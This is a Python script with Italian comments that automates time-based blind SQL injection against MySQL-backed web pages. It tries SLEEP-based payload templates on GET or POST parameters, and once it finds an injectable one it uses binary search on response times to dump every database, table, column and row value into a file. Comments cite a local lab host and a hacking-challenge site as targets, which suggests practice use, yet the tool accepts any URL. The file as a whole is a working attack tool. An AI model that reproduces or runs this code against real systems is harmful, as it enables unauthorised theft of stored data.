import requests
from parse import *
import re
from urllib.parse import urlparse, urlencode
import sys
import binascii
from math import log, ceil

# Indirizzi da attaccare
# GET
# http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com
# POST
# http://vip.hacking.w3challs.com/index.php?page=contact
# destin 1
# msg 1

# Definisco i template di iniettabilità
# format(sleeptime)
templateInjectability = [
    " AND SLEEP({0}) -- -",
    " OR SLEEP({0}) -- -",
    "' AND SLEEP({0}) -- -",
    "' OR SLEEP({0}) -- -",
    "\' AND SLEEP({0}) -- -",
    "\' OR SLEEP({0}) -- -",
    " unhex(27) AND SLEEP({0}) -- -",
    " unhex(27) OR SLEEP({0}) -- -",
    " AND SLEEP({0})",
    " OR SLEEP({0})",
    "' AND SLEEP({0})",
    "' OR SLEEP({0})",
    "\' AND SLEEP({0})",
    "\' OR SLEEP({0})",
    " unhex(27) AND SLEEP({0})",
    " unhex(27) OR SLEEP({0})"
]

# Definisco i template per ottenere la lunghezza di un campo
# format(field, table, cond, row, length, sleeptime)
templateLength = [
    " AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    " OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    "' AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    "' OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    "\' AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    "\' OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    " unhex(27) AND IF(((SELECT LENGTH({0}) WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    " unhex(27) IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0)) -- -",
    " AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    " OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    "' AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    "' OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    "\' AND IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    "\' OR IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    " unhex(27) AND IF(((SELECT LENGTH({0}) WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))",
    " unhex(27) IF(((SELECT LENGTH({0}) FROM {1} WHERE {2} LIMIT {3}, 1)={4}), SLEEP({5}), SLEEP(0))"
]

# Definisco i template per ottenere il numero di colonne
# format(field, table, cond, length, sleeptime)
templateRows = [
    " AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    " OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    "' AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    "' OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    "\' AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    "\' OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    " unhex(27) AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    " unhex(27) IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0)) -- -",
    " AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    " OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    "' AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    "' OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    "\' AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    "\' OR IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    " unhex(27) AND IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))",
    " unhex(27) IF(((SELECT COUNT({0}) FROM {1} WHERE {2})={3}), SLEEP({4}), SLEEP(0))"
]

# Definisco i template per la ricerca del singolo carattere
# format(field, table, cond, row, column, upperbound, sleeptime)
templateSearch = [
    " AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    " OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    "' AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    "' OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    "\' AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    "\' OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    " unhex(27) AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    " unhex(27) IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0)) -- -",
    " AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    " OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    "' AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    "' OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    "\' AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    "\' OR IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    " unhex(27) AND IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))",
    " unhex(27) IF(ORD(MID((SELECT {0} FROM {1} WHERE {2} LIMIT {3}, 1), {4}, 1))<{5}, SLEEP({6}), SLEEP(0))"
]

# Definisco una funzione per convertire stringhe in CHAR leggibili dal db
def convertToChar(string):
    concatList = ["CHAR("]
    stringV = list(string)

    concatList.append(str(ord(stringV[0])))

    for c in range(1, len(stringV)):
        concatList.append("," + str(ord(stringV[c])))

    return "".join(concatList) + ")"

# Definisco una funzione per testare se il parametro fornito è iniettabile, se lo è ritorno il valore utilizzato nella SLEEP
def isInjectable():
    outFile.write("Test di iniettabilità\n")
    injectable = "FALSE"
    result = []
    for i in range(0, 5):
        for k in range(0, 15):
            if(method == "GET"):
                for j in range(0, len(paramsAndValues)):
                    test1 = requests.get(url)
                    testUrl = sourceUrl + "?"
                    for k in range(0, j):
                        testUrl += paramsAndValues[k] + "&"
                    #payload=b"\"paramsAndValues[j]+\"' AND SLEEP(\"+str(i+1)+\") -- -"
                    #payload=str(binascii.hexlify(payload), 'ascii')
                    #testUrl+="unhex("+payload+")"
                    testUrl += paramsAndValues[j] + templateInjectability[k].format(str(i+1))
                    for k in range(j + 1, len(paramsAndValues)):
                        testUrl += "&" + paramsAndValues[k]
                    outFile.write(testUrl + "\n")
                    test2 = requests.get(testUrl)
                    if(test2.elapsed.total_seconds() - test1.elapsed.total_seconds() > (i + 0.5) and test2.elapsed.total_seconds() < timeout):
                        injectable = "TRUE"
                        print("Il campo " + paramsAndValues[j] + " è iniettabile")
                        outFile.write("Il campo " + paramsAndValues[j] + " è iniettabile\n")
                        result.append(i + 1)
                        result.append(k)
                        return result
            else:
                data = dict(zip(params, values))
                for j in range(0, len(params)):
                    test1 = requests.post(sourceUrl, data = data)
                    #print(test1.elapsed.total_seconds())
                    attackValues = values.copy()
                    attackValues[j] += templateInjectability[k].format(str(i+1))
                    attackData = dict(zip(params, attackValues))
                    outFile.write(sourceUrl + " " + str(attackData) + "\n")
                    test2 = requests.post(sourceUrl, data = attackData) #devo usare hex sull'apice   provare con data=
                    #print(test2.elapsed.total_seconds())
                    if(test2.elapsed.total_seconds() - test1.elapsed.total_seconds() > (i + 0.5) and test2.elapsed.total_seconds() < timeout):
                        injectableParams[j] = "TRUE"
                        print("Il campo " + params[j] + " è iniettabile")
                        outFile.write("Il campo " + params[j] + " è iniettabile\n")
                        result.append(i + 1)
                        result.append(k)
                        return result
    if(injectable == "FALSE"):
        print("Nessun campo è iniettabile")
        outFile.write("Nessun campo è iniettabile\n")
        #Chiudo il programma
        sys.exit()
        
#Definisco 3 funzioni per ottenere la lunghezza di un campo
def getLength1(field, table, row):
    outFile.write("Ottengo la lunghezza di " + field + " alla riga " + str(row) + "\n")
    for i in range(0, 100):
        #arthur@guide.com' AND IF(LENGTH(email)>5, SLEEP(3), SLEEP(0)) -- - funziona! e anche così arthur@guide.com' AND IF(((SELECT LENGTH(email) FROM accounts LIMIT 0, 1)=16), SLEEP(5), SLEEP(2)) -- -
        #lenghtPayload = "' AND IF(((SELECT LENGTH(" + field + ") FROM " + table + " LIMIT " + str(row) + ", 1)=" + str(i) + "), SLEEP(" + str(time) + "), SLEEP(0)) -- -"
        if(method == "GET"):
            lenghtPayload = templateLength[templateIndex].format(field, table, "1=1", row, str(i), time)
            outFile.write(url + lenghtPayload + "\n")
            lengthTest = requests.get(url + lenghtPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateLength[templateIndex].format(field, table, "1=1", row, str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            lengthTest = requests.post(sourceUrl, data = attackData)
        if lengthTest.elapsed.total_seconds() > (time - 0.5) and lengthTest.elapsed.total_seconds() < timeout:
          return i

def getLength2(field, dbToAttack, row):
    outFile.write("Ottengo la lunghezza di " + field + " alla riga " + str(row) + "\n")
    for i in range(0, 100):
        #lenghtPayload = "' AND IF(((SELECT LENGTH(" + field + ") FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='"+dbToAttack+"' LIMIT "+str(row)+", 1)="+str(i)+"), SLEEP("+str(time)+"), SLEEP(0)) -- -"
        if(method == "GET"):
            lenghtPayload = templateLength[templateIndex].format(field, "INFORMATION_SCHEMA.TABLES", "TABLE_SCHEMA='" + dbToAttack + "'", row, str(i), time)
            outFile.write(url + lenghtPayload + "\n")
            lengthTest = requests.get(url + lenghtPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateLength[templateIndex].format(field, "INFORMATION_SCHEMA.TABLES", "TABLE_SCHEMA=" + convertToChar(dbToAttack), row, str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            lengthTest = requests.post(sourceUrl, data = attackData)
        if lengthTest.elapsed.total_seconds() > (time - 0.5) and lengthTest.elapsed.total_seconds() < timeout:
          return i

def getLength3(field, dbToAttack, tableToAttack, row):
    outFile.write("Ottengo la lunghezza di " + field + " alla riga " + str(row) + "\n")
    for i in range(0, 100):
        #lenghtPayload="' AND IF(((SELECT LENGTH("+field+") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='"+dbToAttack+"' AND TABLE_NAME='"+tableToAttack+"' LIMIT "+str(row)+", 1)="+str(i)+"), SLEEP("+str(time)+"), SLEEP(0)) -- -"
        if(method == "GET"):
            lenghtPayload = templateLength[templateIndex].format(field, "INFORMATION_SCHEMA.COLUMNS", "TABLE_SCHEMA='" + dbToAttack + "' AND TABLE_NAME='" + tableToAttack + "'", row, str(i), time)
            outFile.write(url + lenghtPayload + "\n")
            lengthTest = requests.get(url + lenghtPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateLength[templateIndex].format(field, "INFORMATION_SCHEMA.COLUMNS", "TABLE_SCHEMA=" + convertToChar(dbToAttack) + " AND TABLE_NAME=" + convertToChar(tableToAttack), row, str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            lengthTest = requests.post(sourceUrl, data = attackData)
        if lengthTest.elapsed.total_seconds() > (time - 0.5) and lengthTest.elapsed.total_seconds() < timeout:
          return i

#Definisco 3 funzioni per ottenere il numero di colonne
def getRows1(field, table):
    outFile.write("Ottengo il numero di righe della tabella " + table + "\n")
    i = 0
    while 1:
        if(method == "GET"):
            #arthur@guide.com' AND IF(LENGTH(email)>5, SLEEP(3), SLEEP(0)) -- - funziona! e anche così arthur@guide.com' AND IF(((SELECT LENGTH(email) FROM accounts LIMIT 0, 1)=16), SLEEP(5), SLEEP(2)) -- -
            #rowsPayload="' AND IF(((SELECT COUNT("+field+") FROM "+table+")="+str(i)+"), SLEEP("+str(time)+"), SLEEP(0)) -- -"
            rowsPayload = templateRows[templateIndex].format(field, table, "1=1", str(i), time)
            outFile.write(url + rowsPayload + "\n")
            rowsTest = requests.get(url + rowsPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateRows[templateIndex].format(field, table, "1=1", str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            rowsTest = requests.post(sourceUrl, data = attackData)
        if rowsTest.elapsed.total_seconds() > (time - 0.5) and rowsTest.elapsed.total_seconds() < timeout:
            return i
        i = i + 1

def getRows2(field, table, dbToAttack):
    outFile.write("Ottengo il numero di righe della tabella " + table + "\n")
    i = 0
    while 1:
        if(method == "GET"):
            #rowsPayload="' AND IF(((SELECT COUNT("+field+") FROM "+table+" WHERE TABLE_SCHEMA='"+dbToAttack+"')="+str(i)+"), SLEEP("+str(time)+"), SLEEP(0)) -- -"
            rowsPayload = templateRows[templateIndex].format(field, table, "TABLE_SCHEMA='" + dbToAttack + "'", str(i), time)
            outFile.write(url + rowsPayload + "\n")
            rowsTest = requests.get(url + rowsPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateRows[templateIndex].format(field, table, "TABLE_SCHEMA=" + convertToChar(dbToAttack), str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            rowsTest = requests.post(sourceUrl, data = attackData)
        if rowsTest.elapsed.total_seconds() > (time - 0.5) and rowsTest.elapsed.total_seconds() < timeout:
            return i
        i = i + 1

def getRows3(field, table, dbToAttack, tableToAttack):
    outFile.write("Ottengo il numero di righe della tabella " + table + "\n")
    i = 0
    while 1:
        if(method == "GET"):
            #rowsPayload="' AND IF(((SELECT COUNT("+field+") FROM "+table+" WHERE TABLE_SCHEMA='"+dbToAttack+"' AND TABLE_NAME='"+tableToAttack+"')="+str(i)+"), SLEEP("+str(time)+"), SLEEP(0)) -- -"
            rowsPayload = templateRows[templateIndex].format(field, table, "TABLE_SCHEMA='" + dbToAttack + "' AND TABLE_NAME='" + tableToAttack + "'", str(i), time)
            outFile.write(url + rowsPayload + "\n")
            rowsTest = requests.get(url + rowsPayload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateRows[templateIndex].format(field, table, "TABLE_SCHEMA=" + convertToChar(dbToAttack) +" AND TABLE_NAME=" + convertToChar(tableToAttack), str(i), time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            rowsTest = requests.post(sourceUrl, data = attackData)
        if rowsTest.elapsed.total_seconds() > (time - 0.5) and rowsTest.elapsed.total_seconds() < timeout:
            return i
        i = i + 1

###Definisco una funzione per effetuare la ricerca del singolo carattere
##def search(payloadPart1, payloadPart2):
##    i = 255
##    while i != 0:
##        #print(str(start)+" "+str(end))
##        payload = payloadPart1 + str(i) + payloadPart2
##        #print(payload)
##        searchTest = requests.get(url + payload)
##        #print(binaryTest.elapsed.total_seconds())
##        if searchTest.elapsed.total_seconds() > (time - 0.5):
##            print(str(i) + " " + chr(i))
##            return chr(i)
##        i = i - 1
##        if i == 0:
##            return chr(0)
##    return chr(0)

#Definisco una funzione per effetuare la ricerca binaria del singolo carattere
def binarySearch(field, table, cond, row, column):
    start = 0
    end = 255
    mid = 0
    while True:
        temp = mid
        mid = (start + end) // 2
        if temp == mid:
            break
        #payload = payloadPart1 + str(mid) + payloadPart2
        if(method == "GET"):
            payload = templateSearch[templateIndex].format(field, table, cond, row, column, mid, time)
            outFile.write(url + payload + "\n")
            searchTest = requests.get(url + payload)
        else:
            attackValues = values.copy()
            attackValues[injParam] += templateSearch[templateIndex].format(field, table, cond, row, column, mid, time)
            attackData = dict(zip(params, attackValues))
            #print(attackData)
            outFile.write(sourceUrl + " " + str(attackData) + "\n")
            searchTest = requests.post(sourceUrl, data = attackData)
        if searchTest.elapsed.total_seconds() > (time - 0.5) and searchTest.elapsed.total_seconds() < timeout:
            end = mid
        else:
            start = mid
    outFile.write("Ho ottenuto " + str(mid) + " -> " + chr(mid) + "\n")
    return chr(mid)

#hex(ord('\'')) Operazione per sapere l'esadecimale dell'apice
#request.Request(url, data)
#Apro un file di testo per scrivere il log del software
outFile = open("log.txt","w")
#Apro un file di testo per scrivere i dati ottenuti dall'attacco
dataFile = open("data.txt","w")
method = ""
while method != "GET" and method != "POST":
    print("Scegliere il metodo che si vuole utilizzare per l'attacco: (scrivere GET o POST)")
    method = input()
    method = method.upper()
if(method == "GET"):
    print("Inserire l'url da attaccare contenente i parametri ed i rispettivi valori")
    url = input()
    sourceUrl = (url.split('?'))[0]
    paramsAndValues = (url.split('?'))[1]
    paramsAndValues = paramsAndValues.split('&')
    #print(paramsAndValues)
    url = sourceUrl + "?" + paramsAndValues[0]
    for i in range(1, len(paramsAndValues)):
        url += "&" + paramsAndValues[i]
else:
    print("Inserire l'url da attaccare")
    sourceUrl = input()
    print("Inserire il numero di parametri per l'attacco")
    numParams = (int)(input()) #Controllare che sia un numero
    params = []
    print("Inserire i parametri da attaccare")
    for i in range(0, numParams):
        params.append(input())
    values = []
    for i in range(0, numParams):
        print("Inserire il valore del parametro " + params[i])
        values.append(input())
    #print(params)
    #print(values)
    data = dict(zip(params, values))
    #print(data)
    injectableParams = []
    for i in range(0, numParams):
        injectableParams.append("FALSE")

    ans = requests.post(sourceUrl, data = data)
    #print(ans.elapsed.total_seconds())
        
outFile.write("Url da attaccare " + sourceUrl + " con metodo " + method + "\n")
dataFile.write("Url da attaccare " + sourceUrl + " con metodo " + method + "\n")
#Definisco un timeout
timeout = 20
#Testo se il parametro fornito è iniettabile
tempInjectability = isInjectable()
time = tempInjectability[0]
templateIndex = tempInjectability[1]
injParam = -1
if(method == "POST"):
    for i in range (0, numParams):
        if(injectableParams[i] == "TRUE"):
            injParam = i
#print(str(injParam) + " " + str(templateIndex))
#Ottengo i nomi dei database
rows = getRows1("SCHEMA_NAME", "INFORMATION_SCHEMA.SCHEMATA")
print("Database: " + str(rows))
outFile.write("Database: " + str(rows) + "\n")
dataFile.write("Database: " + str(rows) + "\n")
databases = []
for row in range(0, rows):
    length = getLength1("SCHEMA_NAME", "INFORMATION_SCHEMA.SCHEMATA", row)
    print("Lunghezza " + str(length) + ", tempo richiesto stimato: " + str(ceil(time * length * log(256))) + " secondi")
    database = []
    for column in range(0, length):
        #arthur@guide.com' AND IF(ORD(MID( (SELECT email FROM accounts LIMIT 0,1) ,1,1))>96, SLEEP(5), SLEEP(2)) -- - funziona!
        #database.append(binarySearch("' AND IF(ORD(MID((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(row)+", 1), "+str(column+1)+", 1))<", ", SLEEP("+str(time)+"), SLEEP(0)) -- -"))
        database.append(binarySearch("SCHEMA_NAME", "INFORMATION_SCHEMA.SCHEMATA", "1=1", str(row), str(column+1)))
    print("".join(database))
    outFile.write("Ho ottenuto " + ("".join(database)) + "\n")
    dataFile.write(("".join(database)) + "\n")
    databases.append("".join(database))
temp = databases.copy()
#Se i database si chiamano utenti users accounts come il sito o altro attacco subito quei db
print("Scegliere il database da attaccare: (inserire il numero del database)")
for i in range(0, rows):
    print(str(i) + " " + temp.pop(0))
temp = databases.copy()
dbToAttack = temp.pop(int(input()))
print("Attacco " + dbToAttack)
outFile.write("Attacco " + dbToAttack + "\n")
dataFile.write("Attacco " + dbToAttack + "\n")
#Estraggo i nomi delle tabelle
rows = getRows2("TABLE_NAME", "INFORMATION_SCHEMA.TABLES", dbToAttack)
print("Tabelle: " + str(rows))
outFile.write("Tabelle: " + str(rows) + "\n")
dataFile.write("Tabelle: " + str(rows) + "\n")
tables = []
for row in range(0, rows):
    length = getLength2("TABLE_NAME", dbToAttack, row)
    print("Lunghezza " + str(length) + ", tempo richiesto stimato: " + str(ceil(time * length * log(256))) + " secondi")
    table = []
    for column in range(0, length):
        #table.append(binarySearch("' AND IF(ORD(MID((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='"+dbToAttack+"' LIMIT "+str(row)+", 1), "+str(column+1)+", 1))<", ", SLEEP("+str(time)+"), SLEEP(0)) -- -"))
        table.append(binarySearch("TABLE_NAME", "INFORMATION_SCHEMA.TABLES", "TABLE_SCHEMA=" + convertToChar(dbToAttack), str(row), str(column+1)))
    print("".join(table))
    outFile.write("Ho ottenuto " + ("".join(table)) + "\n")
    dataFile.write(("".join(table)) + "\n")
    tables.append("".join(table))
#print(tables)
temp = tables.copy()
#Se le tabelle si chiamano utenti users accounts o altro attacco subito quelle tabelle
print("Scegliere la tabella da attaccare: (inserire il numero della tabella)")
for i in range(0, rows):
    print(str(i) + " " + temp.pop(0))
temp = tables.copy()
tableToAttack = temp.pop(int(input()))
print("Attacco " + tableToAttack)
outFile.write("Attacco " + tableToAttack + "\n")
dataFile.write("Attacco " + tableToAttack + "\n")
#Estraggo i nomi dei campi
rows = getRows3("COLUMN_NAME", "INFORMATION_SCHEMA.COLUMNS", dbToAttack, tableToAttack)
print("Campi: " + str(rows))
outFile.write("Campi: " + str(rows) + "\n")
dataFile.write("Campi: " + str(rows) + "\n")
fields = []
for row in range(0, rows):
    length = getLength3("COLUMN_NAME", dbToAttack, tableToAttack, row)
    print("Lunghezza " + str(length) + ", tempo richiesto stimato: " + str(ceil(time * length * log(256))) + " secondi")
    field = []
    for column in range(0, length):
        #field.append(binarySearch("' AND IF(ORD(MID((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='"+dbToAttack+"' AND TABLE_NAME='"+tableToAttack+"' LIMIT "+str(row)+", 1), "+str(column+1)+", 1))<", ", SLEEP("+str(time)+"), SLEEP(0)) -- -"))
        field.append(binarySearch("COLUMN_NAME", "INFORMATION_SCHEMA.COLUMNS", "TABLE_SCHEMA=" + convertToChar(dbToAttack) + " AND TABLE_NAME=" + convertToChar(tableToAttack), str(row), str(column+1)))
    print("".join(field))
    outFile.write("Ho ottenuto " + ("".join(field)) + "\n")
    dataFile.write(("".join(field)) + "\n")
    fields.append("".join(field))
#print(fields)
#temp = fields.copy()
#for i in range(0, rows):
#    print(str(i) + " " + temp.pop(0))
temp = fields.copy()
numFields = rows
#Estraggo i valori dei campi(prima la lunghezza poi il valore)
for j in range(0, numFields):
    #print(temp)
    field = temp.pop(0)
    print("Estraggo i valori del campo " + field)
    outFile.write("Estraggo i valori del campo " + field + "\n")
    dataFile.write("Estraggo i valori del campo " + field + "\n")
    rows = getRows1(field, dbToAttack + "." + tableToAttack)
    print("Valori: " + str(rows))
    outFile.write("Valori: " + str(rows) + "\n")
    dataFile.write("Valori: " + str(rows) + "\n")
    fieldValues = []
    for row in range(0, rows):
        #print(str(injParam) + " " + str(templateIndex))
        length = getLength1(field, dbToAttack + "." + tableToAttack, row)
        print("Lunghezza " + str(length) + ", tempo richiesto stimato: " + str(ceil(time * length * log(256))) + " secondi")
        #r=requests.get(url+"' AND IF(ORD(MID((SELECT email FROM accounts LIMIT 0, 1), 1, 1))>96, SLEEP(3), SLEEP(0)) -- -")
        #print(r.elapsed.total_seconds())
        #hex1=str(binascii.hexlify(b'\''), 'ascii')
        #print(hex1)
        fieldValue = []
        for column in range(0, length):
            #arthur@guide.com' AND IF(ORD(MID( (SELECT email FROM accounts LIMIT 0,1) ,1,1))>96, SLEEP(5), SLEEP(2)) -- - funziona!
            #value.append(binarySearch("' AND IF(ORD(MID((SELECT "+field+" FROM "+dbToAttack+"."+tableToAttack+" LIMIT "+str(row)+", 1), "+str(column+1)+", 1))<", ", SLEEP("+str(time)+"), SLEEP(0)) -- -"))
            fieldValue.append(binarySearch(field, dbToAttack+"."+tableToAttack, "1=1", str(row), str(column+1)))
        print("".join(fieldValue))
        outFile.write("Ho ottenuto " + ("".join(fieldValue)) + "\n")
        dataFile.write(("".join(fieldValue)) + "\n")
        fieldValues.append("".join(fieldValue))
    temp2 = fieldValues.copy()
    #for i in range(0, rows):
    #    print(str(i) + " " + temp2.pop(0))
outFile.close()
dataFile.close()
print("I dati estratti sono stati salvati nel file data.txt\nNel file log.txt sono presenti tutte le istruzioni eseguite per ottenere i dati")
#hex(ord('a')) oppure "stringa".encode('hex') oppure import binascii e str(binascii.hexlify(b'stringa'), 'ascii') per evitare che vengano tagliate le virgolette
#unhex(risultato riga precedente senza '0x') nella query "1 AND SLEEP(5) AND unhex(61)=unhex(61)" funziona!

#In vipwebarmy basta usare destin="1 AND SLEEP(5)" e message non vuoto
